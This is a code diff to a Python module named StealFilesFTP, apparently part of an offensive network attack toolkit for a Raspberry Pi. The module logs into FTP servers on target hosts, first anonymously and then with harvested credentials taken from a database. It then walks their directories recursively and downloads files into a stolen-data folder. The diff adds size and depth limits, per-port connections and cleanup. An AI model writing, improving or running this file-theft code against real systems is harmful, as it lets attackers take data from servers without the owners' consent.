@@ -108,20 +108,28 @@ class StealFilesFTP:
         return out
 
     # -------- FTP helpers --------
-    def connect_ftp(self, ip: str, username: str, password: str) -> Optional[FTP]:
+    # Max file size to download (10 MB) — protects RPi Zero RAM
+    _MAX_FILE_SIZE = 10 * 1024 * 1024
+    # Max recursion depth for directory traversal (avoids symlink loops)
+    _MAX_DEPTH = 5
+
+    def connect_ftp(self, ip: str, username: str, password: str, port: int = b_port) -> Optional[FTP]:
         try:
             ftp = FTP()
-            ftp.connect(ip, b_port, timeout=10)
+            ftp.connect(ip, port, timeout=10)
             ftp.login(user=username, passwd=password)
             self.ftp_connected = True
-            logger.info(f"Connected to {ip} via FTP as {username}")
+            logger.info(f"Connected to {ip}:{port} via FTP as {username}")
             return ftp
         except Exception as e:
-            logger.info(f"FTP connect failed {ip} {username}:{password}: {e}")
+            logger.info(f"FTP connect failed {ip}:{port} {username}: {e}")
             return None
 
-    def find_files(self, ftp: FTP, dir_path: str) -> List[str]:
+    def find_files(self, ftp: FTP, dir_path: str, depth: int = 0) -> List[str]:
         files: List[str] = []
+        if depth > self._MAX_DEPTH:
+            logger.debug(f"Max recursion depth reached at {dir_path}")
+            return []
         try:
             if self.shared_data.orchestrator_should_exit or self.stop_execution:
                 logger.info("File search interrupted.")
@@ -136,7 +144,7 @@ class StealFilesFTP:
 
                 try:
                     ftp.cwd(item)  # if ok -> directory
-                    files.extend(self.find_files(ftp, os.path.join(dir_path, item)))
+                    files.extend(self.find_files(ftp, os.path.join(dir_path, item), depth + 1))
                     ftp.cwd('..')
                 except Exception:
                     # not a dir => file candidate
@@ -146,11 +154,19 @@ class StealFilesFTP:
             logger.info(f"Found {len(files)} matching files in {dir_path} on FTP")
         except Exception as e:
             logger.error(f"FTP path error {dir_path}: {e}")
-            raise
         return files
 
     def steal_file(self, ftp: FTP, remote_file: str, base_dir: str) -> None:
         try:
+            # Check file size before downloading
+            try:
+                size = ftp.size(remote_file)
+                if size is not None and size > self._MAX_FILE_SIZE:
+                    logger.info(f"Skipping {remote_file} ({size} bytes > {self._MAX_FILE_SIZE} limit)")
+                    return
+            except Exception:
+                pass  # SIZE not supported, try download anyway
+
             local_file_path = os.path.join(base_dir, os.path.relpath(remote_file, '/'))
             os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
             with open(local_file_path, 'wb') as f:
@@ -161,6 +177,7 @@ class StealFilesFTP:
 
     # -------- Orchestrator entry --------
     def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
+        timer = None
         try:
             self.shared_data.bjorn_orch_status = b_class
             try:
@@ -168,11 +185,14 @@ class StealFilesFTP:
             except Exception:
                 port_i = b_port
 
+            hostname = self.hostname_for_ip(ip) or ""
+            self.shared_data.comment_params = {"ip": ip, "port": str(port_i), "hostname": hostname}
+
             creds = self._get_creds_for_target(ip, port_i)
             logger.info(f"Found {len(creds)} FTP credentials in DB for {ip}")
 
             def try_anonymous() -> Optional[FTP]:
-                return self.connect_ftp(ip, 'anonymous', '')
+                return self.connect_ftp(ip, 'anonymous', '', port=port_i)
 
             if not creds and not try_anonymous():
                 logger.error(f"No FTP credentials for {ip}. Skipping.")
@@ -192,9 +212,11 @@ class StealFilesFTP:
             # Anonymous first
             ftp = try_anonymous()
             if ftp:
+                self.shared_data.comment_params = {"user": "anonymous", "ip": ip, "port": str(port_i), "hostname": hostname}
                 files = self.find_files(ftp, '/')
                 local_dir = os.path.join(self.shared_data.data_stolen_dir, f"ftp/{mac}_{ip}/anonymous")
                 if files:
+                    self.shared_data.comment_params = {"user": "anonymous", "ip": ip, "port": str(port_i), "hostname": hostname, "files": str(len(files))}
                     for remote in files:
                         if self.stop_execution or self.shared_data.orchestrator_should_exit:
                             logger.info("Execution interrupted.")
@@ -207,7 +229,6 @@ class StealFilesFTP:
                 except Exception:
                     pass
                 if success:
-                    timer.cancel()
                     return 'success'
 
             # Authenticated creds
@@ -216,13 +237,15 @@ class StealFilesFTP:
                     logger.info("Execution interrupted.")
                     break
                 try:
-                    logger.info(f"Trying FTP {username}:{password} @ {ip}")
-                    ftp = self.connect_ftp(ip, username, password)
+                    self.shared_data.comment_params = {"user": username, "ip": ip, "port": str(port_i), "hostname": hostname}
+                    logger.info(f"Trying FTP {username} @ {ip}:{port_i}")
+                    ftp = self.connect_ftp(ip, username, password, port=port_i)
                     if not ftp:
                         continue
                     files = self.find_files(ftp, '/')
                     local_dir = os.path.join(self.shared_data.data_stolen_dir, f"ftp/{mac}_{ip}/{username}")
                     if files:
+                        self.shared_data.comment_params = {"user": username, "ip": ip, "port": str(port_i), "hostname": hostname, "files": str(len(files))}
                         for remote in files:
                             if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                 logger.info("Execution interrupted.")
@@ -235,14 +258,15 @@ class StealFilesFTP:
                     except Exception:
                         pass
                     if success:
-                        timer.cancel()
                         return 'success'
                 except Exception as e:
                     logger.error(f"FTP loot error {ip} {username}: {e}")
 
-            timer.cancel()
             return 'success' if success else 'failed'
 
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
             return 'failed'
+        finally:
+            if timer:
+                timer.cancel()
